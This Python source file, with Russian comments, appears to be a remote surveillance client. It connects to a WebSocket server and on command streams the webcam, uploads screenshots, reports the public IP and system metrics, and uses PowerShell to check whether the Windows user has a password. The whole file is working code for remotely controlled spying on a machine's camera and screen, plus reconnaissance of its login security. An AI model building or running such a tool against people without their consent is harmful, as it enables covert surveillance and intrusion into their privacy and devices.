import cv2
import requests
import time
import logging
import threading
from mss import mss  # Для захвата скриншотов
from mss.tools import to_png  # Для конвертации в PNG
import websocket  # pip install websocket-client
import psutil       # Для получения системных метрик
import platform     # Для информации о процессоре и ОС
import json         # Для сериализации данных в JSON
import subprocess
import getpass

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("client.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Настройки
BASE_URL = "http://127.0.0.1:4000"
SERVER_URL = "http://127.0.0.1:4000/upload"  # Адрес сервера для загрузки данных
FRAME_RATE = 10           # Количество кадров в секунду (для видео)
SCREENSHOT_INTERVAL = 5   # Интервал между скриншотами (в секундах)
WS_URL = "ws://127.0.0.1:4000/ws"  # URL WebSocket-сервера

# Глобальный флаг трансляции – по умолчанию выключен
streaming_active = False

def send_ip_via_ws(ws):
    """
    Получает публичный IP через ipify и отправляет его на сервер через WebSocket.
    Формат сообщения: "ip:<адрес>"
    """
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip = response.json().get("ip")
        logger.info(f"Получен публичный IP: {ip}")
        ws.send("ip:" + ip)
    except Exception as e:
        logger.error(f"Ошибка получения или отправки публичного IP: {e}")

def collect_and_send_metrics(ws):
    """
    Собирает метрики системы (дисковое пространство, оперативную память, процессор, ОС)
    и отправляет их на сервер в формате JSON.
    """
    metrics = {}
    try:
        # Получаем данные по дисковому пространству для системного диска (обычно C:\)
        disk_usage = psutil.disk_usage("C:\\")
        metrics["disk_total"] = disk_usage.total
        metrics["disk_free"] = disk_usage.free

        # Получаем данные по оперативной памяти
        mem = psutil.virtual_memory()
        metrics["memory_total"] = mem.total
        metrics["memory_available"] = mem.available

        # Тип процессора
        metrics["processor"] = platform.processor()

        # Операционная система
        metrics["os"] = f"{platform.system()} {platform.release()}"
        metrics["has_password"] = current_user_has_password()
    except Exception as e:
        logger.error(f"Ошибка сбора метрик: {e}")
        metrics["error"] = str(e)

    try:
        # Отправляем метрики на сервер
        ws.send(json.dumps({"command": "metrics", "data": metrics}))
        logger.info("Метрики отправлены на сервер")
    except Exception as e:
        logger.error(f"Ошибка отправки метрик: {e}")

def capture_and_send_video():
    """
    Захват видео и скриншотов.
    Камера открывается только когда streaming_active True.
    При выключении трансляции камера закрывается, чтобы не нагружать систему.
    """
    camera = None

    while True:
        if streaming_active:
            if camera is None:
                camera = cv2.VideoCapture(0)
                if not camera.isOpened():
                    logger.error("Камера не найдена. Попытка повторного открытия через 5 секунд.")
                    camera = None
                    time.sleep(5)
                    continue
                logger.info("Камера успешно запущена.")

            ret, frame = camera.read()
            if not ret:
                logger.error("Ошибка захвата кадра")
                time.sleep(1)
                continue

            _, buffer = cv2.imencode(".jpg", frame)
            frame_data = buffer.tobytes()

            try:
                logger.info("Отправка кадра на сервер...")
                response = requests.post(
                    f"{SERVER_URL}",
                    data=frame_data,
                    headers={"Content-Type": "image/jpeg"}
                )
                if response.status_code == 200:
                    logger.info("Кадр успешно отправлен.")
                else:
                    logger.error(f"Ошибка отправки кадра: {response.status_code} - {response.text}")
            except Exception as e:
                logger.error(f"Ошибка отправки видео: {e}")

            time.sleep(1 / FRAME_RATE)
        else:
            if camera is not None:
                camera.release()
                camera = None
                logger.info("Камера освобождена (трансляция остановлена).")
            time.sleep(1)

def takeScreenshot():
    sct = mss()

    try:
        screenshot = sct.grab(sct.monitors[1])
        screenshot_data = to_png(screenshot.rgb, screenshot.size)
        logger.info("Отправка скриншота на сервер...")
        response = requests.post(
            f"{SERVER_URL}/screenshot",
            data=screenshot_data,
            headers={"Content-Type": "image/png"}
        )
        if response.status_code == 200:
            logger.info("Скриншот успешно отправлен.")
        else:
            logger.error(f"Ошибка отправки скриншота: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error(f"Ошибка захвата или отправки скриншота: {e}")

def control_ws():
    """
    Подключается к WebSocket-серверу и слушает команды управления.
    Команды:
      - "start": включает трансляцию,
      - "stop": останавливает трансляцию,
      - "send_ip": инициирует отправку публичного IP и местоположения.
    """
    def on_message(ws, message):
        global streaming_active
        logger.info(f"Получена команда: {message}")
        cmd = message.lower()
        if cmd == "stop":
            streaming_active = False
            logger.info("Трансляция остановлена командой сервера.")
        elif cmd == "start":
            streaming_active = True
            logger.info("Трансляция запущена командой сервера.")
        elif cmd == "send_ip":
            logger.info("Отправка данных по IP и местоположению по команде сервера.")
            send_ip_via_ws(ws)
        elif cmd == "screenshot":
            takeScreenshot()
        elif cmd == "metrics":
            collect_and_send_metrics(ws)

    def on_error(ws, error):
        logger.error(f"WebSocket ошибка: {error}")

    def on_close(ws, close_status_code, close_msg):
        logger.info("WebSocket соединение закрыто")

    def on_open(ws):
        logger.info("WebSocket соединение установлено")
        ws.send("Client connected")
        send_ip_via_ws(ws)

    while True:
        try:
            ws = websocket.WebSocketApp(WS_URL,
                                        on_open=on_open,
                                        on_message=on_message,
                                        on_error=on_error,
                                        on_close=on_close)
            ws.run_forever()
        except Exception as e:
            logger.error(f"Ошибка WebSocket подключения: {e}")
        time.sleep(5)  # Попытка переподключения через 5 секунд



def current_user_has_password() -> bool:
    username = getpass.getuser()

    ps_command = f'Get-LocalUser -Name "{username}" | Select-Object -ExpandProperty PasswordRequired'
    command = ['powershell', '-Command', ps_command]

    try:
        output = subprocess.check_output(
            command,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=10
        ).strip().lower()
        return output == 'true'

    except Exception:
        return False

if __name__ == "__main__":
    logger.info("Клиент запустился")
    # Проверка доступности сервера
    try:
        response = requests.get(f"{SERVER_URL.replace('/upload', '/api/time')}", timeout=5)
        if response.status_code == 200:
            logger.info(f"Сервер доступен. Серверное время: {response.text}")
        else:
            logger.error(f"Ошибка подключения к серверу: {response.status_code}")
            exit(1)
    except Exception as e:
        logger.error(f"Ошибка подключения к серверу: {e}")
        exit(1)

    # Запуск потока WebSocket для управления трансляцией
    ws_thread = threading.Thread(target=control_ws, daemon=True)
    ws_thread.start()

    # Запуск основного цикла захвата и отправки видео/скриншотов
    capture_and_send_video()
